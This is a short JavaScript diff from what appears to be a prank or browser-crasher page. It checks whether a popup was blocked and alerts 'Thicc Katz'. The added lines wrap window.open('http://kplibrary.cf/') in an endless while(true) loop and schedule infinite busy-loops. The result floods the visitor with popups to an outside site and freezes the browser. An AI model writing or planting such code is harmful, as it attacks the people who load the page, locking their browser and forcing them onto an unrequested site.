@@ -5,8 +5,10 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  window.open("http://kplibrary.cf/");
-  setTimeout(function() {
-    for (var i = 0; i === i; i++) {}
-  }, 500);
+  while (true) {
+    window.open("http://kplibrary.cf/")
+    setTimeout(function() {
+      for (var i = 0; i === i; i++) {}
+    }, 500);
+  }
 }
